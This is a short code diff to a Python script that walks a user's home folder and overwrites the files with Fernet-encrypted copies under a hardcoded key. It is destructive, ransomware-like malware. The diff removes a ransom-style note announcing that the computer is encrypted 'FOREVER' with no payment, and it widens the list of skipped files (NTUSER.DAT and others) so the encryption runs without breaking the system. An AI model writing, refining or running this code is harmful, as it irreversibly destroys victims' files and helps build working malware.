@@ -10,7 +10,6 @@ from cryptography.fernet import Fernet
 # Use your own key and initialization vector (IV) for encryption
 key = base64.b64decode('NFhMMWNtbUU2X3pnVTV1QXVGZTZBQ2pOMjMxWk00ZHVhaHdYay1rd090OD0=')
 iv = b''
-os.system('echo Your computer has been encrypted FOREVER. There is no payment. > README.txt')
 def encrypt_files(folder, exclusions):
     fernet = Fernet(key)
     for path, _, files in os.walk(folder):
@@ -25,7 +24,7 @@ def encrypt_files(folder, exclusions):
             with open(file_path, 'wb') as f:
                 f.write(encrypted_data)
 # Specify the exclusions for files/file extensions to be skipped during encryption
-exclusions = [".txt", "txt", "dat", ".dat", "DAT", ".DAT"]
+exclusions = [".txt", "txt", "dat", ".dat", "DAT", ".DAT", "ntuser.dat", "NTUSER.DAT", "ntuser.DAT"]
 # Replace 'C:/' with the appropriate directory path
 folder_path = '/Users/' + user
 # Call the encrypt_files function
